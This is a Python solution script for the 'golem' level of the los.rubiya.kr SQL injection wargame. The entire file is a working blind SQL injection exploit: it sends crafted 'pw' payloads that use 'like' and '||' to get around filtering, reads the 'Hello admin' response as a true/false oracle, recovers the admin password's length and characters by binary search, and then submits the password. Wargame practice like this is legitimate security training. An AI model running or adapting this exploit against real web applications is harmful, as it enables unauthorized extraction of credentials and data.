import requests
import os


URL_ID=os.environ['URL_ID']

PHPSESSID=os.environ['PHPSESSID']


url = f"https://los.rubiya.kr/chall/golem_{URL_ID}.php"

cookie = {'PHPSESSID': PHPSESSID}



pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'pw': f'\' || id like \'admin\' && {i} < length(pw) && \'1\' like \'1'},cookies=cookie)

    if res.text.find("Hello admin") > 0:
        pw_length = i + 1
    else:
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 127
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'pw': f'\' || id like \'admin\' && {target} < ascii(SUBSTRING(pw,{i+1},1)) && \'1\' like \'1'}, cookies=cookie)

        if res.text.find("Hello admin") > 0:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code + 1))
    print(f"(in progress)ans: {ans}")

print(f"pw: {ans}")

res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")